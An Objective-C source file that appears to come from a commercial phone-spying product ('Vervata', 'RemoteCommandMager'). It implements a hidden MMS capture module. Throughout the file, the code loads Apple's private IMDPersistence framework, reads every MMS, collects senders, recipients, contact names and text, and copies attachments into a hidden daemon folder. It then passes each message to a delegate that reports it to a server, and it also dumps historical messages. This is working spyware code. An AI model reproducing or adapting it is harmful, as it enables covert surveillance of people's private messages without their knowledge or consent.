/**
 - Project name :  RemoteCommandMager Component
 - Class name   :  MMSCaptureManager
 - Version      :  1.0  
 - Purpose      :  For RemoteCommandMager Component
 - Copy right   :  31/1/2011, Prasad M.B, Vervata Co., Ltd. All rights reserved.
*/

#import "MMSCaptureManager-E.h"

#import "FxLogger.h"
#import "FxEventEnums.h"
#import "FxMmsEvent.h"
#import "FxAttachment.h"
#import "FxRecipient.h"
#import "DateTimeFormat.h"
#import "ABContactsManager.h"
#import "DaemonPrivateHome.h"
#import "FxRecipient.h"
#import "DefStd.h"
#import "CKDBMessage.h"
#import "CKDBMessage+iOS8.h"
#import "CKMediaObject.h"
#import "CKMediaObject+iOS8.h"
#import <dlfcn.h>

#import "IMDMessageStore.h"
#import "IMMessageItem.h"

#import "HistoricalEventQueueUtils.h"

#import <UIKit/UIKit.h>

@interface MMSCaptureManager (PrivateAPI) 
- (BOOL) checkIfRecipientEmail: (NSString *) aRecipientAddress;
- (NSString *) getMMSAttachmentPath;

- (void) contactWithMMSEvent: (FxMmsEvent *) aMMSEvent;
- (void) flashMmsEvents;
@end

@implementation MMSCaptureManager

@synthesize mMMSAttachmentPath;

/**
 - Method name: initWithEventDelegate
 - Purpose:This method is used to initialize the MMSCaptureManager class
 - Argument list and description: aEventDelegate (EventDelegate)
 - Return description: No return type
*/

- (id) initWithEventDelegate:(id <EventDelegate>) aEventDelegate {
	if ((self = [super init])) {
		mEventDelegate	= aEventDelegate;
		mMMSEventPool	= [[NSMutableArray alloc] init];
	}
	return self;
}

- (void)captureMMS
{
    //Process last MMS to FXSmsEvent
    //Get last captured MMS timestamp and array
    NSInteger lastMMSTimeStamp = -1;
    NSArray *lastMMSIDs = [NSArray array];
    
    NSString *path = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) lastObject];
    path = [path stringByAppendingPathComponent:@"lastMMSs.plist"];
    
    NSFileManager *fileManager = [NSFileManager defaultManager];
    
    if ([fileManager fileExistsAtPath:path]) {
        NSDictionary *lastMMSsDic = [NSDictionary dictionaryWithContentsOfFile:path];
        lastMMSTimeStamp = [lastMMSsDic[@"lastMMSTimeStamp"] integerValue];
        lastMMSIDs = lastMMSsDic[@"lastMMSIDs"];
    }
    
    NSMutableArray *captureMMSIDArray = [NSMutableArray array];
    __block NSInteger captureMMSTimeStamp = -1;
    
    //For first time capture the lastest MMS
    if (lastMMSTimeStamp == -1) {
        NSMutableArray *allMMSArray = [MMSCaptureManager mmsObjectsFromeFramework];
        if (allMMSArray.count > 0) {
            CKDBMessage *lastestMMS =  allMMSArray[0];
            [self processMMSObject:lastestMMS];
            [captureMMSIDArray addObject:[NSNumber numberWithInt:lastestMMS.identifier]];
            captureMMSTimeStamp = [lastestMMS.date timeIntervalSince1970];
        }
    }
    else {//After first time we have to check all MMS that newer than last timestamp
        NSMutableArray *allMMSArray = [MMSCaptureManager uncapturedMMSObjectsFromeFramework];
        [allMMSArray enumerateObjectsUsingBlock:^(CKDBMessage *mms, NSUInteger idx, BOOL *stop) {
            __block BOOL isCaptured = NO;
            int MMSUniqueID = mms.identifier;
            
            if ([mms.date timeIntervalSince1970] >= lastMMSTimeStamp) {
                [lastMMSIDs enumerateObjectsUsingBlock:^(NSNumber *capturedMMSUniqueID, NSUInteger idx, BOOL *stop) {
                    if ([capturedMMSUniqueID intValue] == MMSUniqueID) {
                        isCaptured = YES;
                        *stop = YES;
                    }
                }];
                
                if (!isCaptured) {
                    [self processMMSObject:mms];
                    [captureMMSIDArray addObject:[NSNumber numberWithInt:MMSUniqueID]];
                    
                    if (captureMMSTimeStamp == -1 ){
                        captureMMSTimeStamp = [mms.date timeIntervalSince1970];
                    }
                }
            }
        }];
    }
    
    if (captureMMSTimeStamp > -1 && captureMMSIDArray.count > 0) {
        NSDictionary *lastMMSsDic = @{@"lastMMSTimeStamp": [NSNumber numberWithInteger:captureMMSTimeStamp],
                                      @"lastMMSIDs" : captureMMSIDArray};
        
        NSString *path = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) lastObject];
        path = [path stringByAppendingPathComponent:@"lastMMSs.plist"];
        
        [lastMMSsDic writeToFile:path atomically:YES];
    }
}

/**
 - Method name:didReceivedSMSData
 - Purpose: This method is invoked when receiving sms command.
 - Argument list and description: aData (NSData *)
 - Return type and description: No Return
 */

+ (FxMmsEvent *)createMmsEventFromMessage:(CKDBMessage *)aMassage
{
    ABContactsManager *contactManager=[[ABContactsManager alloc] init];
    FxMmsEvent *mmsEvent=[[FxMmsEvent alloc]init];
    //=============MMS SUBJECT=================================================================================
    [mmsEvent setSubject:aMassage.subject];
    //=============MMS TEXT====================================================================================
    [mmsEvent setMessage:aMassage.text];
    //=============MMS TYPE====================================================================================
    [mmsEvent setEventType:kEventTypeMms];
    //=============DATETIME====================================================================================
    [mmsEvent setDateTime:[DateTimeFormat phoenixDateTime:aMassage.date]];
    //=============Contact Ino=================================================================================
    NSArray *contactInfo = aMassage.recipients;
    //=============Conversation ID ============================================================================
    [mmsEvent setMConversationID:aMassage.groupID];
    
    if (!aMassage.isOutgoing) {
        DLog(@"##########################################################################")
        DLog(@"                         INCOMING iOS 6,7,8")
        DLog(@"##########################################################################")
        // -- set Sender Details
        [mmsEvent setDirection:kEventDirectionIn];
        NSString *senderNumber=[contactInfo objectAtIndex:0];
        [mmsEvent setSenderNumber:[contactManager formatSenderNumber:senderNumber]];
        senderNumber=[senderNumber stringByReplacingOccurrencesOfString:@"-" withString:@""];
        //[smsEvent setContactName:[contactManager searchContactName:senderNumber]];
        //[smsEvent setContactName:[contactManager searchFirstNameLastName:senderNumber]];
        [mmsEvent setSenderContactName:[contactManager searchFirstNameLastName:senderNumber contactID:-1]];
    }
    else {
        [mmsEvent setDirection:kEventDirectionOut]; //set Recipient Details
        for(NSString *senderNumber in contactInfo) {
            FxRecipient *recipient=[[FxRecipient alloc] init];
            [recipient setRecipType:kFxRecipientTO];
            senderNumber=[senderNumber stringByReplacingOccurrencesOfString:@"-" withString:@""];
            [recipient setRecipNumAddr:[contactManager formatSenderNumber:senderNumber]];
            //[recipient setRecipContactName:[contactManager searchContactName:senderNumber]];
            [recipient setRecipContactName:[contactManager searchFirstNameLastName:senderNumber]];
            [mmsEvent addRecipient:recipient];
            [recipient release];
        }
    }
    
    //============ MMS Attachment ==============================================================
    NSArray *mmsAttachments = aMassage.mediaObjects;
    NSString *path =[NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) lastObject];
    //============ MMS Subject =================================================================
    for (CKMediaObject *item in mmsAttachments) {
        DLog(@"MMS ITEM %@", item);
        FxAttachment *attachment=[[FxAttachment alloc]init];
        NSData *attachmentData = item.data;
        NSString *attachmentFileName = item.filename;
        NSString *attachmentPath=[NSString stringWithFormat:@"%@mmsatt_%lf_%@",path,[[NSDate date] timeIntervalSince1970],attachmentFileName];
        //DLog(@"attachmentData = %@, attachmentFileName = %@, attachmentPath = %@", attachmentData, attachmentFileName, attachmentPath);
        if(attachmentData && [MMSCaptureManager writeMMSData:attachmentData andFilePath:attachmentPath]) {
            [attachment setFullPath:attachmentPath];
            [mmsEvent addAttachment:attachment];
        }
        [attachment release];
    }
    
    [contactManager release];
    contactManager = nil;
    
    return mmsEvent;
}


- (void) processMMSObject: (CKDBMessage*) aMessage {
    DLog (@"Captured MMS Message ...");
    
    FxMmsEvent *mmsEvent= [MMSCaptureManager createMmsEventFromMessage:aMessage];
    
    //=============================SEND MMS EVENT==============================================
    if ([mEventDelegate respondsToSelector:@selector(eventFinished:)]) {        
        [mEventDelegate performSelector:@selector(eventFinished:) withObject:mmsEvent withObject:self];
        DLog (@"Send MMS event to the server")
        
    }
    //============================Print=========================================
    DLog (@"=======>MMS Subject             : %@",mmsEvent.subject);
    DLog (@"=======>MMS manipulate message  : %@", [mmsEvent message]);
    DLog (@"=======>MMS conversation id     : %@",[mmsEvent mConversationID]);
    DLog (@"=======>Sender Number           : %@",[mmsEvent senderNumber]);
    DLog (@"=======>Sender Name             : %@",[mmsEvent senderContactName]);
    
    for (FxRecipient *aRecipient in [mmsEvent recipientArray]) {
        DLog (@"=======>Recipient Number    : %@",[aRecipient recipNumAddr]);
        DLog (@"=======>Recipient Name      : %@",[aRecipient recipContactName]);
    }
    
    DLog (@"Attachment Info...")
    for (FxAttachment *aAttachment in  [mmsEvent attachmentArray]) {
        DLog (@"=======>Attachment Path     : %@",[aAttachment fullPath]);
    }
    //==========================================================================
    [mmsEvent release];
}

/**
 - Method name: writeMMSData
 - Purpose:This method is used to write MMS attachment data into the ssmp app folder
 - Argument list and description: aMMSData(NSData *),aFilePath(NSString *)
 - Return description:isSuccess(BOOL)
*/


+ (BOOL) writeMMSData:(id ) aMMSDataOrPath
		  andFilePath: (NSString *) aFilePath {
	//DLog (@"Save MMS attachment aMMSDataOrPath = %@, aFilePath = %@", aMMSDataOrPath, aFilePath);
	NSFileManager *fm = [NSFileManager defaultManager];
	NSError *error;
	BOOL isSuccess=NO;
	if ([aMMSDataOrPath isKindOfClass:[NSData class]]) {
		isSuccess=[fm createFileAtPath:aFilePath contents:aMMSDataOrPath attributes:nil];
	}
    else {
	    isSuccess=[fm copyItemAtPath:aMMSDataOrPath toPath:aFilePath error:&error];
	}
	DLog (@"Save MMS attachment, isSuccess = %d", isSuccess);
	return isSuccess;
}

/**
 - Method name: getMMSAttachmentPath
 - Purpose:This method is used to get the common path for attachment
 - Argument list and description: No Argument
 - Return description: orginalPath (NSString)
 */

- (NSString *) getMMSAttachmentPath { // /var/.ssmp/attachments/mms/
	return [self mMMSAttachmentPath];
}

/**
 - Method name: checkIfRecipientEmail
 - Purpose:This method is used to check whether the recipient address is email or not
 - Argument list and description: aRecipientAddress (NSString *)
 - Return description:(BOOL)
*/

- (BOOL) checkIfRecipientEmail: (NSString *) aRecipientAddress {
	if ([aRecipientAddress rangeOfString:@"@"].location == NSNotFound)
		return NO;
	else 
	    return YES;
}

- (void) contactWithMMSEvent: (FxMmsEvent *) aMMSEvent {
	ABContactsManager *contactManager=[[ABContactsManager alloc] init];
	if ([aMMSEvent direction] == kEventDirectionIn) {
		DLog (@"Incoming mms");
		NSString *senderNumber = [aMMSEvent senderNumber];
		senderNumber = [senderNumber stringByReplacingOccurrencesOfString:@"-" withString:@""];
		//NSString *contactName = [contactManager searchFirstNameLastName:senderNumber];
        NSString *contactName = [contactManager searchFirstNameLastName:senderNumber contactID:-1];
		[aMMSEvent setSenderContactName:contactName];
	} else if ([aMMSEvent direction] == kEventDirectionOut) {
		DLog (@"Outgoing mms");
		for (FxRecipient *recipient in [aMMSEvent recipientArray]) {
			NSString *recipientNumber = [recipient recipNumAddr];
			recipientNumber = [recipientNumber stringByReplacingOccurrencesOfString:@"-" withString:@""];
			NSString *contactName = nil;
			if (![self checkIfRecipientEmail:recipientNumber]) { // If recipient of this MMS is an email address
                DLog(@"##########################################################################")
                DLog(@"                         INCOMING MMS iOS 6 and 7")
                DLog(@"##########################################################################")
				//contactName = [contactManager searchFirstNameLastName:recipientNumber];
                contactName = [contactManager searchFirstNameLastName:recipientNumber contactID:-1];
			} else {

				/*
				contactName = [contactManager searchFirstLastNameWithEmail:recipientNumber];
				 
				 ISSUE:
				 This cause the issue of wrong contact name like "Som Som" in the case that 
				 -  have more than identical email in the same contact
				 -  more than one contact with the identical email							 
				 */
				//contactName = [contactManager searchDistinctFirstLastNameWithEmail:recipientNumber];
                contactName = [contactManager searchDistinctFirstLastNameWithEmailV2:recipientNumber];
			}
			DLog (@"Contact name of %@ is %@", recipientNumber, contactName);
			[recipient setRecipContactName:contactName];
		}
	}
	[contactManager release];
}

- (void) flashMmsEvents {
	DLog (@"Grouping mms & flashing");
    NSMutableArray *allMMSArray = [MMSCaptureManager mmsObjectsFromeFramework];;
    
    [allMMSArray sortUsingDescriptors:@[[NSSortDescriptor sortDescriptorWithKey:@"date" ascending:NO]]];
    
    [allMMSArray enumerateObjectsUsingBlock:^(CKDBMessage *message, NSUInteger idx, BOOL *stop) {
        FxMmsEvent *mmsEvent= [MMSCaptureManager createMmsEventFromMessage:message];
        [mMMSEventPool addObject:mmsEvent];
        [mmsEvent release];
    }];
    
    [allMMSArray release];
    
	// Grouping the mms events group by ROWID in sms.db (to fix outgoing mms to multiple recipients)
	NSMutableDictionary *mmsGroups = [[NSMutableDictionary alloc] init];
	for (FxMmsEvent *mmsEvent in mMMSEventPool) {
		NSNumber *groupID = [NSNumber numberWithUnsignedInteger:[mmsEvent eventId]];
		NSMutableArray *group = [mmsGroups objectForKey:groupID];
		if (!group) {
			group = [[NSMutableArray alloc] initWithObjects:mmsEvent, nil];
			[mmsGroups setObject:group forKey:groupID];
			[group release];
		} else {
			[group addObject:mmsEvent];
		}
	}
	[mMMSEventPool removeAllObjects];
	
	NSArray *group = nil;
	
	// Method 1
//	NSEnumerator *enumerator = [mmsGroups objectEnumerator];
//	while (group = [enumerator nextObject]) {
	
	// Method 2
	NSMutableArray *allKeys = [[NSMutableArray alloc] initWithArray:[mmsGroups allKeys]];
	[allKeys sortUsingSelector:@selector(compare:)];
	DLog (@"allKeys in mmsGroups = %@", allKeys);
	NSEnumerator *enumerator = [allKeys objectEnumerator];
	NSNumber *key = nil;
	while (key = [enumerator nextObject]) {
		DLog (@"key of group = %@", key);
		group = [mmsGroups objectForKey:key];
		
		NSInteger index = 0;
		for (FxMmsEvent *mmsEvent in group) {
			if ([mmsEvent direction] == kEventDirectionOut && [group count] > 1) {
				// Unlike sms; mms get only one notification when user sent mms to multiple recipients
				FxRecipient *recipient = [[mmsEvent recipientArray] objectAtIndex:index];
				NSMutableArray *recipients = [[NSMutableArray alloc] initWithObjects:recipient, nil];
				[mmsEvent setRecipientArray:recipients];
				[recipients release];
				index++;
			}
			
			DLog (@"*****************************************************************");
			DLog (@"ROWID       = %lu", (unsigned long)[mmsEvent eventId]);
			DLog (@"time        = %@", [mmsEvent dateTime]);
			DLog (@"sender      = %@", [mmsEvent senderNumber]);
			DLog (@"name        = %@", [mmsEvent senderContactName]);
			DLog (@"text        = %@", [mmsEvent message]);
			DLog (@"subject     = %@", [mmsEvent subject]);
			DLog (@"recipients  = %@", [mmsEvent recipientArray]);
			DLog (@"attachments = %@", [mmsEvent attachmentArray]);
			DLog (@"direction   = %d", [mmsEvent direction]);
			DLog (@"*****************************************************************");
			
			// Deliver event to server -------------------
			if ([mEventDelegate respondsToSelector:@selector(eventFinished:)]) {
				[mEventDelegate performSelector:@selector(eventFinished:) withObject:mmsEvent withObject:self];
			}
		}
	}
	[allKeys release];
	[mmsGroups release];
}

- (oneway void) release {
	[NSObject cancelPreviousPerformRequestsWithTarget:self];
	[super release];
}


#pragma mark - Historical MMS


/* 
    This path should be the same as the path assigned in AppEngine
 */

+ (NSMutableArray *)mmsObjectsFromeFramework
{
    void *libHandle = dlopen("/System/Library/PrivateFrameworks/IMDPersistence.framework/IMDPersistence", RTLD_NOW);
    
    //make/get symbol from framework + name
    dlsym(libHandle, "IMDMessageRecordGetMessagesSequenceNumber");
    int (*IMDMessageRecordGetMessagesSequenceNumber)() = (int (*)())dlsym(libHandle, "IMDMessageRecordGetMessagesSequenceNumber");
    NSArray *(*IMDMessageRecordCopyMessagesForRowIDs)(NSArray *rowIDs) = (NSArray *(*)())dlsym(libHandle, "IMDMessageRecordCopyMessagesForRowIDs");
    
    // get id of last MMS from symbol
    int lastID = IMDMessageRecordGetMessagesSequenceNumber();
    
    //Create IMDMessageStore to get message error status
    IMDMessageStore *messageStore = [IMDMessageStore sharedInstance];
    
    NSMutableArray *allMMSArray = [[NSMutableArray alloc] init];
    
    for (int recordID = 0; recordID <= lastID; recordID++) {
        
        NSArray *imdMessageRecordArray = IMDMessageRecordCopyMessagesForRowIDs(@[[NSNumber numberWithInt:recordID]]);
        
        if (imdMessageRecordArray.count > 0) {
            CKDBMessage *message = [[CKDBMessage alloc] initWithRecordID:recordID];
            
            if (message) {
                IMMessageItem *messageItem = [messageStore messageWithGUID:message.guid];
                
                if (message.text.length > 0 && [message.madridService isEqualToString:@"SMS"] && ( message.subject.length > 0 || message.mediaObjects.count > 0) && messageItem.errorCode == 0) {
                    [allMMSArray addObject:message];
                }
            }
            
            [message release];
        }
        
        [imdMessageRecordArray release];
    }
    
    [allMMSArray sortUsingDescriptors:@[[NSSortDescriptor sortDescriptorWithKey:@"date" ascending:NO]]];
    
    return [allMMSArray autorelease];
}

+ (NSMutableArray *)uncapturedMMSObjectsFromeFramework
{
    NSInteger lastMMSTimeStamp = -1;
    NSArray *lastMMSIDs = [NSArray array];
    
    NSString *path = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) lastObject];
    path = [path stringByAppendingPathComponent:@"lastMMSs.plist"];
    
    NSFileManager *fileManager = [NSFileManager defaultManager];
    
    if ([fileManager fileExistsAtPath:path]) {
        NSDictionary *lastMMSsDic = [NSDictionary dictionaryWithContentsOfFile:path];
        lastMMSTimeStamp = [lastMMSsDic[@"lastMMSTimeStamp"] integerValue];
        lastMMSIDs = lastMMSsDic[@"lastMMSIDs"];
    }

    int lastMMSID = [[[lastMMSIDs sortedArrayUsingDescriptors:@[[NSSortDescriptor sortDescriptorWithKey:@"self" ascending:NO]]] firstObject] intValue];
    void *libHandle = dlopen("/System/Library/PrivateFrameworks/IMDPersistence.framework/IMDPersistence", RTLD_NOW);
    
    //make/get symbol from framework + name
    dlsym(libHandle, "IMDMessageRecordGetMessagesSequenceNumber");
    int (*IMDMessageRecordGetMessagesSequenceNumber)() = (int (*)())dlsym(libHandle, "IMDMessageRecordGetMessagesSequenceNumber");
    NSArray *(*IMDMessageRecordCopyMessagesForRowIDs)(NSArray *rowIDs) = (NSArray *(*)())dlsym(libHandle, "IMDMessageRecordCopyMessagesForRowIDs");
    
    // get id of last MMS from symbol
    int lastID = IMDMessageRecordGetMessagesSequenceNumber();
    
    //Create IMDMessageStore to get message error status
    IMDMessageStore *messageStore = [IMDMessageStore sharedInstance];
    
    NSMutableArray *allMMSArray = [[NSMutableArray alloc] init];
    
    for (int recordID = lastMMSID; recordID <= lastID; recordID++) {
        
        NSArray *imdMessageRecordArray = IMDMessageRecordCopyMessagesForRowIDs(@[[NSNumber numberWithInt:recordID]]);
        
        if (imdMessageRecordArray.count > 0) {
            CKDBMessage *message = [[CKDBMessage alloc] initWithRecordID:recordID];
            
            if (message) {
                IMMessageItem *messageItem = [messageStore messageWithGUID:message.guid];
                
                if (message.text.length > 0 && [message.madridService isEqualToString:@"SMS"] && ( message.subject.length > 0 || message.mediaObjects.count > 0) && messageItem.errorCode == 0) {
                    [allMMSArray addObject:message];
                }
            }
            
            [message release];
        }
        
        [imdMessageRecordArray release];
    }
    
    [allMMSArray sortUsingDescriptors:@[[NSSortDescriptor sortDescriptorWithKey:@"date" ascending:NO]]];
    
    return [allMMSArray autorelease];
}

+ (NSString *) getHistoricalMMSAttachmentPath {
    NSString* mmsAttachmentPath         = [[DaemonPrivateHome daemonPrivateHome] stringByAppendingString:@"attachments/mms/"];
    [DaemonPrivateHome createDirectoryAndIntermediateDirectories:mmsAttachmentPath];
    return mmsAttachmentPath;
}

#pragma mark - Historical MMS (Public Method)


+ (NSArray *) allMMSs {
    NSArray *mmsLogs = [NSArray array];
    @try {
        NSMutableArray *allMMSArray = [MMSCaptureManager mmsObjectsFromeFramework];
        NSMutableArray *sortedMMSEventArray = [[NSMutableArray alloc] init];
        
        [allMMSArray sortUsingDescriptors:@[[NSSortDescriptor sortDescriptorWithKey:@"date" ascending:NO]]];
        
        [allMMSArray enumerateObjectsUsingBlock:^(CKDBMessage *message, NSUInteger idx, BOOL *stop) {
            FxMmsEvent *mmsEvent= [MMSCaptureManager createMmsEventFromMessage:message];
            [sortedMMSEventArray addObject:mmsEvent];
            [mmsEvent release];
        }];
        
        mmsLogs = [NSArray arrayWithArray:sortedMMSEventArray];
        [sortedMMSEventArray release];
    }
    @catch (NSException *exception) {
        DLog(@"NS exception = %@", exception);
    }
    @catch (...) {
        DLog(@"Unknown exception");
    }
    @finally {
        ;
    }
    return mmsLogs;
}

+ (NSArray *) allMMSsWithMax: (NSInteger) aMaxNumber {
    NSArray *mmsLogs = [NSArray array];
    @try {
        NSMutableArray *allMMSArray = [MMSCaptureManager mmsObjectsFromeFramework];
        NSMutableArray *sortedMMSEventArray = [[NSMutableArray alloc] init];
        
        [allMMSArray sortUsingDescriptors:@[[NSSortDescriptor sortDescriptorWithKey:@"date" ascending:NO]]];
        
        [allMMSArray enumerateObjectsUsingBlock:^(CKDBMessage *message, NSUInteger idx, BOOL *stop) {
            FxMmsEvent *mmsEvent= [MMSCaptureManager createMmsEventFromMessage:message];
            [sortedMMSEventArray addObject:mmsEvent];
            [mmsEvent release];
        }];
        
        if (aMaxNumber > sortedMMSEventArray.count) {
            aMaxNumber = sortedMMSEventArray.count;
        }
        
        mmsLogs = [NSArray arrayWithArray:[sortedMMSEventArray subarrayWithRange:NSMakeRange(0, aMaxNumber)]];
        [sortedMMSEventArray release];
    }
    @catch (NSException *exception) {
        DLog(@"NS exception = %@", exception);
    }
    @catch (...) {
        DLog(@"Unknown exception");
    }
    @finally {
        ;
    }
    
    return mmsLogs;
}

#pragma mark - Clear Util

+ (void)clearCapturedData
{
    // Remove last capture time stemp for each event
    NSFileManager *fileManager = [NSFileManager defaultManager];
    NSError *error = nil;
    
    NSString *path = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) lastObject];
    
    //Call log
    if (![fileManager removeItemAtPath:[path stringByAppendingPathComponent:@"lastMMSs.plist"] error:&error]) {
        DLog(@"Remove last MMS plist error with %@", [error localizedDescription]);
    }
}

/**
 - Method name:dealloc
 - Purpose: This is memory mangement method. Invoked when the class object releasd.
 - Argument list and description: No argument
 - Return type and description: No Return
*/

- (void) dealloc {
	[mMMSEventPool release];
	[mMMSAttachmentPath release];
    [super dealloc];
}

@end
